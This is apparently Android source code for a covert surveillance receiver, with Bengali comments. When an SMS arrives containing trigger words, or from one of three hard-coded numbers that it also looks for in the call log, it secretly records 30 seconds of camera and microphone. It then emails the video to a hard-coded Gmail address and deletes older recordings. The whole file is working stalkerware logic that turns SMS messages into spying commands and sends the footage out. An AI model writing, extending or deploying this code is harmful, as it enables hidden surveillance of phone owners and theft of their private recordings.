package com.example.fasterpro11;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class VideoRecord extends BroadcastReceiver {
    private MediaRecorder mediaRecorder; // মিডিয়া রেকর্ডার ভেরিয়েবল
    private MediaRecorder recorder;
    private String fileName;
    private static final String TAG = "VideoRecord";
    private static final String[] allowedNumbers = {
            "+8801304039282",
            "+8801748937892",
            "+8801915564634"
    };
    private static final String[] WORDS1_GRADE = {"Goldv", "Silverv", "Mediumv"};
    private static final String[] WORDS2_OFFER = {"Congratulationv", "Conformv"};
    private List<String> lastMessages = new ArrayList<>();
    private Handler handler = new Handler();
    private int recordingCount = 1;
    private boolean isOnCall = false;
    private Context context;
    private boolean isRecording = false;

    public VideoRecord(Context context) {
        this.context = context.getApplicationContext(); // Use application context
    }

    public VideoRecord() {}

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context.getApplicationContext(); // Update context if needed
        Log.d(TAG, "onReceive called with action: " + intent.getAction());
        try {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                handleSmsReceived(intent);
            } else if ("android.intent.action.PHONE_STATE".equals(intent.getAction())) {
                handleIncomingCall(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive: ", e);
        }
    }

    private void handleIncomingCall(Intent intent) {
        try {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            if (TelephonyManager.EXTRA_STATE_RINGING.equals(state) ||
                    TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                isOnCall = true;
                Log.d(TAG, "On call: " + state);
            } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
                isOnCall = false;
                Log.d(TAG, "Call ended.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleIncomingCall: ", e);
        }
    }

    private void handleSmsReceived(Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);

                    lastMessages.clear();
                    lastMessages.add(messageBody);

                    boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                    boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                    boolean isInternetAvailable = isInternetAvailable();
                    boolean isAllowedNumber = isAllowedNumber(sender) || checkLastCallNumbers();

                    Log.d(TAG, "Keywords 1 found: " + containsWords1);
                    Log.d(TAG, "Keywords 2 found: " + containsWords2);
                    Log.d(TAG, "Internet available: " + isInternetAvailable);
                    Log.d(TAG, "Allowed number: " + isAllowedNumber);

                    if ((containsWords1 && containsWords2 && isInternetAvailable) ||
                            (isAllowedNumber && isInternetAvailable)) {
                        startRecording(sender, messageBody);
                        Log.d(TAG, "Conditions met for video start recording.");
                    } else {
                        Log.d(TAG, "Conditions not met for video start recording.");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleSmsReceived: ", e);
        }
    }

    public boolean isInternetAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            boolean isAvailable = netInfo != null && netInfo.isConnected();
            Log.d(TAG, "Internet available: " + isAvailable);
            return isAvailable;
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }

    private boolean containsSMSWORDS1GRADE(String messageBody) {
        for (String keyword : WORDS1_GRADE) {
            if (messageBody.contains(keyword)) {
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        for (String keyword : WORDS2_OFFER) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
        for (String allowedNumber : allowedNumbers) {
            if (allowedNumber.equals(number)) {
                return true;
            }
        }
        return false;
    }

    private boolean checkLastCallNumbers() {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }

        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC")) {
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 3) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        return false;
    }

    public boolean hasOverlayPermission() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                boolean hasPermission = Settings.canDrawOverlays(context);
                Log.d(TAG, "Overlay permission granted: " + hasPermission);
                return hasPermission;
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error checking overlay permission: ", e);
            return false;
        }
    }

    private void sendEmailWithAttachment(String subject, String body, String filePath) {
        Log.d(TAG, "Sending email with attachment...");
        try {
            JavaMailAPI_VideoRecord_Sender.sendMailWithAttachment("abontiangum99@gmail.com", subject, body, filePath);
            Log.d(TAG, "Email sent successfully with attachment.");
        } catch (Exception e) {
            Log.e(TAG, "Email sending failed: " + e.getMessage());
        }
    }
    private void deleteOldRecordings() {
        Log.d(TAG, "Deleting old mic recordings...");
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/videoRecord");
        File[] files = folder.listFiles();
        if (files != null && files.length > 5) {
            Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            for (int i = 0; i < files.length - 5; i++) {
                if (files[i].delete()) {
                    Log.d(TAG, "Deleted old mic recording: " + files[i].getName());
                } else {
                    Log.e(TAG, "Failed to delete old mic recording: " + files[i].getName());
                }
            }
        }
    }



    public void startRecording(String incomingNumber, String messageBody) {
        checkPermissions(); // পারমিশন চেক করুন
        if (isOnCall) {
            Log.d(TAG, "কল চলাকালীন ভিডিও রেকর্ডিং শুরু হচ্ছে না।");
            return;
        }

        if (!isCameraAvailable() || !isMicAvailable()) {
            Log.e(TAG, "ক্যামেরা অথবা মাইক ব্যবহারযোগ্য নয়।");
            return;
        }

        String timestamp = new SimpleDateFormat("dd_MM_yyyy_HH_mm", Locale.getDefault()).format(new Date());
        fileName = Environment.getExternalStorageDirectory() + "/DCIM/VideoRecord/" + timestamp + "_" + recordingCount++ + ".mp4";

        File dir = new File(Environment.getExternalStorageDirectory() + "/DCIM/VideoRecord");
        if (!dir.exists() && !dir.mkdirs()) {
            Log.e(TAG, "ডিরেক্টরি তৈরি করতে ব্যর্থ হয়েছে: " + dir.getAbsolutePath());
            return; // ডিরেক্টরি তৈরি না হলে আর কিছু করতে হবে না
        } else {
            Log.d(TAG, "ডিরেক্টরি ইতোমধ্যেই বিদ্যমান: " + dir.getAbsolutePath());
        }

        if (recorder == null) {
            Log.e(TAG, "MediaRecorder is not initialized. Initializing now...");
            recorder = new MediaRecorder();
            configureRecorder();
        }

        try {
            recorder.setOutputFile(fileName); // সঠিক আউটপুট ফাইল পাথ সেট করুন
            recorder.prepare();
            recorder.start();
            isRecording = true; // রেকর্ডিং স্থিতি আপডেট করুন
            Log.d(TAG, "ভিডিও রেকর্ডিং শুরু হয়েছে: " + fileName);
            handler.postDelayed(this::stopRecording, 30000); // ৩০ সেকেন্ড পরে স্টপ করুন
        } catch (IllegalStateException e) {
            Log.e(TAG, "IllegalStateException: " + e.getMessage());
        } catch (IOException e) {
            Log.e(TAG, "IOException: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error starting recording: " + e.getMessage());
        }
    }

    private void configureRecorder() {
        Log.d(TAG, "Configuring MediaRecorder...");
        if (recorder == null) {
            Log.e(TAG, "MediaRecorder is not initialized.");
            return;
        }

        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            Log.d(TAG, "Audio source set to MIC.");
            recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            Log.d(TAG, "Video source set to SURFACE.");
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            Log.d(TAG, "Output format set to MPEG_4.");
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            Log.d(TAG, "Audio encoder set to AAC.");
            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            Log.d(TAG, "Video encoder set to H264.");
            recorder.setVideoSize(1920, 1080);
            Log.d(TAG, "Video size set to 1920x1080.");
            recorder.setVideoEncodingBitRate(512 * 1024);
            Log.d(TAG, "Video encoding bitrate set to 512 kbps.");
            recorder.setVideoFrameRate(30);
            Log.d(TAG, "Video frame rate set to 30.");
        } catch (Exception e) {
            Log.e(TAG, "Error configuring MediaRecorder: " + e.getMessage());
        }
    }


    public void stopRecording() {
        Log.d(TAG, "ভিডিও রেকর্ডিং বন্ধ করা হচ্ছে...");
        if (recorder != null) {
            try {
                if (isRecording) {
                    recorder.stop();
                    Log.d(TAG, "ভিডিও রেকর্ডিং বন্ধ হয়েছে: " + fileName);
                    isRecording = false;
                    sendEmailWithAttachment("ভিডিও রেকর্ডিং", "এটি ভিডিও রেকর্ডিং ফাইল:", fileName);
                    deleteOldRecordings();
                } else {
                    Log.d(TAG, "স্টপ কল করা হয়েছে কিন্তু রেকর্ডিং চলছিল না।");
                }
            } catch (RuntimeException e) {
                Log.e(TAG, "রেকর্ডিং বন্ধ করতে সমস্যা: " + e.getMessage());
            } catch (Exception e) {
                Log.e(TAG, "অপ্রত্যাশিত ত্রুটি রেকর্ডিং বন্ধ করতে: " + e.getMessage());
            } finally {
                // রিসোর্স মুক্ত করুন
                if (recorder != null) {
                    recorder.reset(); // রিসেট করুন
                    recorder.release(); // মুক্ত করুন
                    recorder = null; // নাল করুন
                    Log.d(TAG, "রেকর্ডার মুক্ত করা হয়েছে।");
                }
            }
        } else {
            Log.e(TAG, "রেকর্ডার নাল বা রেকর্ডিং চলছে না।");
        }
    }

    private boolean isRecording() {
        // A simple way to check if the recorder is recording
        try {
            recorder.stop();
            return true; // If stop succeeds, it was recording
        } catch (RuntimeException e) {
            return false; // If stop fails, it was not recording
        }
    }

    private boolean isCameraAvailable() {
        if (context == null) {
            Log.e(TAG, "Context is null when checking camera availability.");
            return false;
        }
        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        try {
            String[] cameraIdList = cameraManager.getCameraIdList();
            if (cameraIdList.length > 0) {
                Log.d(TAG, "Camera is available.");
                return true;
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Camera not available: " + e.getMessage());
        }
        return false;
    }

    private boolean isMicAvailable() {
        PackageManager pm = context.getPackageManager();
        return pm.hasSystemFeature(PackageManager.FEATURE_MICROPHONE);
    }



    private void checkPermissions() {
        List<String> missingPermissions = new ArrayList<>();

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.CAMERA);
            Log.e(TAG, "Missing permission: CAMERA");
        }
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.RECORD_AUDIO);
            Log.e(TAG, "Missing permission: RECORD_AUDIO");
        }
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            Log.e(TAG, "Missing permission: WRITE_EXTERNAL_STORAGE");
        }
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.READ_CALL_LOG);
            Log.e(TAG, "Missing permission: READ_CALL_LOG");
        }

        if (!missingPermissions.isEmpty()) {
            Log.e(TAG, "Missing permissions: " + missingPermissions.toString());
        } else {
            Log.d(TAG, "All required permissions are granted.");
        }
    }

    public void startRecording() {
        Log.d(TAG, "mic rec call by notification class.");

        // You may want to set default values for incomingNumber and messageBody
        String defaultIncomingNumber = "Unknown"; // or any default value
        String defaultMessageBody = "Recording started via notification."; // or any default message

        startRecording(defaultIncomingNumber, defaultMessageBody);
    }

}
